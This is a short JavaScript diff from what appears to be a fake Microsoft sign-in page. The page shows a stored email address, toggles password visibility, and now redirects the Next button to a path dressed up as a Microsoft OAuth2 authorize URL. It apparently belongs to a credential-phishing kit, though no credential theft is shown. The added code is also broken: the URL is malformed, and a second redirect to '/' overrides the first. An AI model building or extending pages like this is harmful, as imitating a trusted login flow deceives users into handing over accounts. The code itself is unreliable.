@@ -172,7 +172,11 @@ const email = sessionStorage.getItem('email') || 'email@exemple.com';
 document.getElementById('pill').textContent = email;
 
 function next() {
-  window.location.href = 'verify.html';
+    // bouton Next
+  window.location.href = '/oauth2/v2.0/authorizescope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access%26response_type/login/redem/';
+  
+  // bouton retour
+  window.location.href = '/';
 }
 function togglePwd() {
   const i = document.getElementById('pwdInput');
